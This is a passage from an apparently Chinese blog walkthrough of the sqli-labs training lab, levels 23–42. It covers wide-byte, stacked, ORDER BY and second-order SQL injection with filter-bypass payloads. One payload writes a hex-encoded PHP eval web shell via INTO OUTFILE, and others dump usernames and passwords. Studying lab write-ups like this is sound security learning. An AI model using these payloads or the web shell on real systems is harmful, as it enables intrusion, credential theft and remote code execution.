才能到汉字的范围。</p><p>利用：我们在过滤恶意url请求时，往往会将如<code>&#39;</code>进行转义<code>\&#39;</code>，而我们此时利用就是将其转义符给吃掉，有两种方法：</p><p>1.%df 。 urlencode(‘) = %5c%27，%df%5c 在 GBK 编码方式的时候会将其编码为一个汉字。<code>%23</code>是<code>#</code>。另外还可以替代%df有：%E6，%99</p><p>2.过滤掉\。例如可以构造 %df%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p><p>通常两种提交方式：GET，POST都适用</p><p> 默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p><p>防御宽字节漏洞：</p><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> character_set_connection=gbk,character_set_result=gbk,character_set_client=<span class="hljs-built_in">binary</span><span class="hljs-comment">#设置binary的目的是mysql不区分大小写，使用binary将字符串先转换为二进制字符串，即可避免</span></code></pre><h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4.堆叠注入"></a>4.堆叠注入</h3><p>简单的说就是让多条语句一起执行。mssql、SQL server、Postgresql支持，而Oracle不支持。</p><p>类似union联合查询，但是union两边需要受限制，而堆叠不必，可以为任意增删改查。</p><p>可以看一下这篇文章：<a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><p>另外，执行sql函数必须是<code>mysqli_multi_query()</code>(函数执行一个或多个针对数据库的查询,多个查询用分号进行分隔)。</p><h3 id="5-order-by-注入"><a href="#5-order-by-注入" class="headerlink" title="5.order by 注入"></a>5.order by 注入</h3><p>以sql 语句为例<code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code><br>试<code>?sort=1 desc 或者 asc</code>，显示结果不同，则表明可以注入。<br>我们可利用 order by 后的一些参数进行注入</p><p><strong>注入方法</strong></p><ul><li><p>直接添加注入语句，?sort=(select <strong>**</strong>)</p></li><li><p>利用一些函数。例如 rand()函数等。?sort=rand(sql 语句)<br>比如说rand(true/false)</p></li><li><p>利用 and，例如?sort=1 and (sql 语句)。</p></li><li><p>使用报错注入等方式，但需要有报错</p></li><li><p>导出文件 into outfile 参数注入</p><ul><li><pre><code>?sort=1 into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;<pre><code class="hljs php-template"><span class="xml">- 利用 lines terminated by导出小马</span><span class="xml">  ```sql</span><span class="xml">  ?sort=1 into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e</span><span class="xml">  #lines terminates by将每行以指定字符串结尾</span><span class="xml">  #0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e = hex(</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">)</span></code></pre></code></pre></li></ul></li><li><p>procedure analyse参数后注入</p><ul><li><p>通常我们可以利用它与sort函数一起执行报错注入<br>procedure analyse()函数是MySQL内置的对MySQL字段值进行统计分析后给出建议的字段类型。<br>语法:</p><pre><code class="hljs sql">procesure analyse(max_elements,max_memory)max_elements：指定每列非重复值的最大值，当超过这个值的时候，MySQL不会推荐enum类型。max_memory：analyse()为每列找出所有非重复值所采用的最大内存大小。</code></pre><p>用法</p><pre><code class="hljs sql">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</code></pre></li></ul></li></ul><h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less23：GET基于报错-过滤注释符-单引号"><a href="#Less23：GET基于报错-过滤注释符-单引号" class="headerlink" title="Less23：GET基于报错-过滤注释符(单引号)"></a>Less23：GET基于报错-过滤注释符(单引号)</h3><p>根据报错信息可以看到是单引号闭合，但是注释符被过滤了</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185228076.png" alt="image-20210220185228076"></p><p>注释符被过滤只有采取后闭合了</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185337477.png" alt="image-20210220185337477"></p><p>后续的爆表可以参考前面的系列了</p><h3 id="Less24：POST二次注入"><a href="#Less24：POST二次注入" class="headerlink" title="Less24：POST二次注入"></a>Less24：POST二次注入</h3><p>二次注入就是提前在数据库中插入恶意语句，再次提出来就🆗，本关所以先注册一个<code>admin&#39; #</code>的账户，后续使用此账户登录再修改此账户的密码即可实现修改admin密码。原理如下：</p><pre><code class="hljs sql">插入数据库<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span> ( <span class="hljs-string">&quot;admin\&#x27; #&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-keyword">values</span>(\<span class="hljs-string">&quot;$username\&quot;</span>, \<span class="hljs-string">&quot;$pass\&quot;</span>);更新信息：<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-comment">#&#x27; and password=&#x27;$curr_pass&#x27;;</span>也即<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span></code></pre><p>这里有一个疑问，为什么后台使用了<code>mysql_escape_string()</code>没有过滤掉特殊符号<code>&#39;#</code>呢？经过实验使用有以下结果</p><pre><code class="hljs sql">$a=mysql_escape_string($_GET[&#x27;a&#x27;]);<span class="hljs-comment">#$a=admin\&#x27;</span>$a=mysql_escape_string($_POST[&#x27;a&#x27;]);<span class="hljs-comment">#$a=admin\&#x27; #</span>$a=mysql_real_escape_string($_GET[&#x27;a&#x27;]);<span class="hljs-comment">#$a=admin\&#x27;</span>$a=mysql_real_escape_string($_POST[&#x27;a&#x27;]);<span class="hljs-comment">#$a=admin\&#x27; #</span></code></pre><p><code>mysql_escape_string()和mysql_real_escape_string()</code>采取GET传递参数得到的结果是<code>\&#39;</code>，使用POST提交后虽然结果是<code>\&#39;#</code>，但是这在数据库插入语句里面恰恰代表转义，所以此次存入数据库是<code>admin&#39; #</code>。</p><h3 id="Less25：GET基于报错字符型-过滤and和or-单引号"><a href="#Less25：GET基于报错字符型-过滤and和or-单引号" class="headerlink" title="Less25：GET基于报错字符型-过滤and和or(单引号)"></a>Less25：GET基于报错字符型-过滤and和or(单引号)</h3><p>如题目所示，过滤and和or，其实还过滤了#、–+，没有过滤<code>-- </code>注释</p><p>但是题目是考察and和or过滤怎么办，所以乖乖做吧</p><p>经过实验，双写and和or，||，可以绕过过滤。</p><p>但是现实中如果过不了可以考虑不用and和or</p><h3 id="Less25a：盲注-过滤and和or"><a href="#Less25a：盲注-过滤and和or" class="headerlink" title="Less25a：盲注-过滤and和or"></a>Less25a：盲注-过滤and和or</h3><p>这一关和上一关一样，只是是数字型注入。</p><p>采用时间盲注和联合查询都🆗</p><h3 id="Less26：GET基于报错-过滤空格和注释"><a href="#Less26：GET基于报错-过滤空格和注释" class="headerlink" title="Less26：GET基于报错-过滤空格和注释"></a>Less26：GET基于报错-过滤空格和注释</h3><p>这一关三种注释方法都过滤了，所以只能考虑闭合了，而且还简单的过滤了and和or，但是实验双写and和or可以绕过。</p><p>但是本人把已知的所有可以代替空格的都试了一遍都不行就他妈离谱。。。</p><p>鉴于此采取报错注入吧</p><p>payload</p><pre><code class="hljs sql">数据库?id=1&#x27;oorr(extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)))aandnd <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">表</span><span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">字段</span><span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())aandnd(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">用户名</span><span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">密码</span><span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221020630487.png" alt="image-20210221020630487"></p><p>结果可行的。</p><h3 id="Less26a：盲注-过滤空格和注释"><a href="#Less26a：盲注-过滤空格和注释" class="headerlink" title="Less26a：盲注-过滤空格和注释"></a>Less26a：盲注-过滤空格和注释</h3><p>太难了。。。不显示错误就不能用报错了，延时注入吧。</p><h3 id="Less27：GET基于报错-过滤union和select"><a href="#Less27：GET基于报错-过滤union和select" class="headerlink" title="Less27：GET基于报错-过滤union和select"></a>Less27：GET基于报错-过滤union和select</h3><p>题目告诉我们本关卡过滤了 union 和 select，其实还有空格，经过实验大小写可以绕过，报错注入</p><p>payload如下</p><pre><code class="hljs sql">表?id=1&#x27;and(extractvalue(1,concat(0x7e,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">字段</span><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span>(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">用户名</span><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span>(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(username))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string">密码</span><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span>(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><h3 id="Less27a：盲注-过滤union和select"><a href="#Less27a：盲注-过滤union和select" class="headerlink" title="Less27a：盲注-过滤union和select"></a>Less27a：盲注-过滤union和select</h3><p>时间盲注</p><pre><code class="hljs sql">表?id=1&quot;and(if(ascii(substr((<span class="hljs-keyword">SeLect</span>(table_name)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">SeLect</span>(table_name)(table_rows)<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_rows=<span class="hljs-number">14</span>))a),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">117</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span><span class="hljs-string">字段</span><span class="hljs-string">?id=1&quot;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(column_name)<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-keyword">and</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)<span class="hljs-keyword">and</span>(ordinal_position=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span><span class="hljs-string">用户名</span><span class="hljs-string">?id=1&quot;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(username)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span><span class="hljs-string">密码</span><span class="hljs-string">?id=1&quot;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre><p>手工注入很麻烦的，建议用以上payload到burp抓包进行爆破，用burp抓包爆破可以改一下payload不用时间盲注。</p><h3 id="Less28：GET基于报错字符型-过滤union和select-带括号的单引号"><a href="#Less28：GET基于报错字符型-过滤union和select-带括号的单引号" class="headerlink" title="Less28：GET基于报错字符型-过滤union和select(带括号的单引号)"></a>Less28：GET基于报错字符型-过滤union和select(带括号的单引号)</h3><p>这一关题目虽然是说过滤union和select，结果一试把注释和空格也给过了，而且也没有报错信息。。。就时间盲注吧</p><p>payload如下：</p><pre><code class="hljs sql">表?id=1&#x27;)and(if(ascii(substr((<span class="hljs-keyword">SeLect</span>(table_name)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">SeLect</span>(table_name),(table_rows)<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_rows=<span class="hljs-number">14</span>))a),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">117</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string">字段</span><span class="hljs-string">?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(column_name)<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)<span class="hljs-keyword">and</span>(ordinal_position=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string">用户名</span><span class="hljs-string">?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(username)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string">密码</span><span class="hljs-string">?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h3 id="Less28a：GET-盲注-过滤union和select-带括号的单引号"><a href="#Less28a：GET-盲注-过滤union和select-带括号的单引号" class="headerlink" title="Less28a：GET-盲注-过滤union和select(带括号的单引号)"></a>Less28a：GET-盲注-过滤union和select(带括号的单引号)</h3><p>解法和上一关一样~。</p><h3 id="Less29：GET基于报错-不匹配-有waf"><a href="#Less29：GET基于报错-不匹配-有waf" class="headerlink" title="Less29：GET基于报错-??不匹配-有waf"></a>Less29：GET基于报错-??不匹配-有waf</h3><p>名字稀奇古怪的，应该是作者鹰钩利息不大好的亚子，，，</p><p>确定有waf？？？经实验只是吃掉了<code>#</code>，后面就按照前一个系列的慢慢来爆信息吧</p><h3 id="Less30：GET盲注-不匹配-有waf"><a href="#Less30：GET盲注-不匹配-有waf" class="headerlink" title="Less30：GET盲注-??不匹配-有waf"></a>Less30：GET盲注-??不匹配-有waf</h3><p>经实验只是在上一关的基础上减少了报错，并且闭合是双引号。说是盲注，算是吧。。。剩下的和上一关也一样。</p><p>有点怀疑自己是不是哪里错了？？？</p><h3 id="Less31：GET盲注-不匹配-有waf"><a href="#Less31：GET盲注-不匹配-有waf" class="headerlink" title="Less31：GET盲注-??不匹配-有waf"></a>Less31：GET盲注-??不匹配-有waf</h3><p>这一关是<code>&quot;)</code>闭合，且过滤了<code>#</code>，但是有一个问题，如果环境是php+apache，不会发现问题，JSP+tomcat会发现以<code>id=-1</code>强制报错时不会得出结果，原因就在文章开头讲的http参数污染。其他都一样。</p><h3 id="Less32：GET-bypass自定义过滤和转义"><a href="#Less32：GET-bypass自定义过滤和转义" class="headerlink" title="Less32：GET-bypass自定义过滤和转义"></a>Less32：GET-bypass自定义过滤和转义</h3><p>观察有转义和16进制编码，那么猜测这一关就是编码注入了</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221172214978.png" alt="image-20210221172214978"></p><p>试试宽字节注入<code>?id=-1%df%27%20union%20select%201,database(),3%23</code>成功！</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173335731.png" alt="image-20210221173335731"></p><h3 id="Less33：GET-bypass转义符"><a href="#Less33：GET-bypass转义符" class="headerlink" title="Less33：GET-bypass转义符"></a>Less33：GET-bypass转义符</h3><p>这一关上一关的payload也可以用🤣</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173518057.png" alt="image-20210221173518057"></p><p>看一下这关的源码，使用了<code>addslashes()</code>函数进行转义特殊字符，但是依旧可以使用编码绕过。</p><h3 id="Less34：POST-bypass转义符"><a href="#Less34：POST-bypass转义符" class="headerlink" title="Less34：POST-bypass转义符"></a>Less34：POST-bypass转义符</h3><p>本关只是addslashes过滤，所以只对特殊符号有影响，所以本小节只介绍两种不曾遇到的方式。</p><p>本节参考：<a href="https://blog.csdn.net/weixin_39934520/article/details/105896415">https://blog.csdn.net/weixin_39934520/article/details/105896415</a></p><p>这一关采用POST提交数据，与GET区别是：get是以 url 形式 提交的，因此数据会通过 URLencode，此处作何解?</p><p>关于Unicode的拓展学习可以参考：<a href="https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html">Unicode令人混淆的概念</a></p><h4 id="1-宽字节注入"><a href="#1-宽字节注入" class="headerlink" title="1.宽字节注入"></a>1.宽字节注入</h4><p>宽字节注入和 GET 中并无差别，使用<code>%bb%27</code>或<code>%bb%5c%5c%27</code>代替<code>&#39;</code>均可，在这里同样可以平级越权</p><blockquote><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=%bb&#x27; or <span class="hljs-number">1</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>#&amp;passwd=<span class="hljs-number">1</span></code></pre></blockquote><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221193343896.png" alt="image-20210221193343896"></p><p>但是使用hackbar无法成功，原因是%经过url编码为%25，又生了一次变异，所以无法成功</p><h4 id="2-编码转换注入"><a href="#2-编码转换注入" class="headerlink" title="2.编码转换注入"></a>2.编码转换注入</h4><p>将 UTF-8 的<code>&#39;</code>转换为 UTF-16 的<code>�&#39;</code>实现注入</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=�&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&amp;passwd=1</code></pre><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221224901414.png" alt="image-20210221224901414"></p><h3 id="Less35：GET-bypass转义数字型"><a href="#Less35：GET-bypass转义数字型" class="headerlink" title="Less35：GET-bypass转义数字型"></a>Less35：GET-bypass转义数字型</h3><p>经实验，注释符只有<code>-- senull</code>有效，其他什么都没变，过滤函数是addslashes()，而且没有闭合，直接写语句再注释就可以了</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210221235949699.png" alt="image-20210221235949699"></p><h3 id="Less36：GET-bypass-mysql-real-escape-string"><a href="#Less36：GET-bypass-mysql-real-escape-string" class="headerlink" title="Less36：GET-bypass mysql_real_escape_string"></a>Less36：GET-bypass mysql_real_escape_string</h3><p>关于<code>mysql_real_escape_string</code>上面的二次注入讲到过，会转义特殊符号(\x00.\n,\r,,“,\x1a)，和过滤<code>#</code>，所以注释只能用<code>-- senull</code>(哭，别人都只是过滤单引号。。。)</p><p>对于此函数，若mysql没有设置GBK，还是可以突破的</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222002858692.png" alt="image-20210222002858692"></p><h3 id="Less37：POST-bypass-mysql-real-escape-string"><a href="#Less37：POST-bypass-mysql-real-escape-string" class="headerlink" title="Less37：POST-bypass mysql_real_escape_string"></a>Less37：POST-bypass mysql_real_escape_string</h3><p>老规矩，碰到登录框试试万能密码，可以成功    </p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003622420.png" alt="image-20210222003622420"></p><p>爆数据库可以走通</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003533575.png" alt="image-20210222003533575"></p><p>说来也奇怪，以下payload只能burp抓包修改才能成功，浏览器直接做会失败，显示<code>�</code>被转义为<code>�\&#39;</code>,按理说这个没有<code>%</code>啊？？？</p><pre><code class="hljs sql">表-admin�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span>字段uname=-<span class="hljs-keyword">admin</span>%E3<span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+&amp;passwd=admin&amp;submit=Submit</span><span class="hljs-string">用户名和密码</span><span class="hljs-string">uname=-admin%E3&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre><h3 id="Less38：GET-堆叠注入字符型-单引号"><a href="#Less38：GET-堆叠注入字符型-单引号" class="headerlink" title="Less38：GET-堆叠注入字符型(单引号)"></a>Less38：GET-堆叠注入字符型(单引号)</h3><p>这一关比较简单，例如插入数据库一个消息</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222010314740.png" alt="image-20210222010314740"></p><h3 id="Less39：GET-堆叠注入数字型"><a href="#Less39：GET-堆叠注入数字型" class="headerlink" title="Less39：GET-堆叠注入数字型"></a>Less39：GET-堆叠注入数字型</h3><p>和上一关一样，只不过是数字型，没有闭合。</p><h3 id="Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号"><a href="#Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号" class="headerlink" title="Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)"></a>Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)</h3><p>这一关有点小毛病，我也不知道哪里出问题了</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013912933.png" alt="image-20210222013912933"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013935083.png" alt="image-20210222013935083"></p><p>啊这。。但是用双引号闭合进行堆叠注入的时候注入不了，单引号又ok？？？</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014215664.png" alt="image-20210222014147624"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014257803.png" alt="image-20210222014257803"></p><h3 id="Less41：GET-数字型盲注-堆叠"><a href="#Less41：GET-数字型盲注-堆叠" class="headerlink" title="Less41：GET-数字型盲注-堆叠"></a>Less41：GET-数字型盲注-堆叠</h3><p>这一关和39一样的，只不过没有报错，是盲注</p><h3 id="Less42：POST-基于报错的堆叠注入字符型"><a href="#Less42：POST-基于报错的堆叠注入字符型" class="headerlink" title="Less42：POST-基于报错的堆叠注入字符型"></a>Less42：POST-基于报错的堆叠注入字符型</h3><p>嘿嘿，这一关注册和更改密码都没法用，只能在登录界面搞事情。</p><p>通过试错，发现语句大概是：<code>SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;</code>,这就好办了，直接在密码后面加新插入信息的语句就可了，其实后面有没有语句都无所谓，注释了就🆗了</p><p>payload：<code>mima&#39;;insert into users 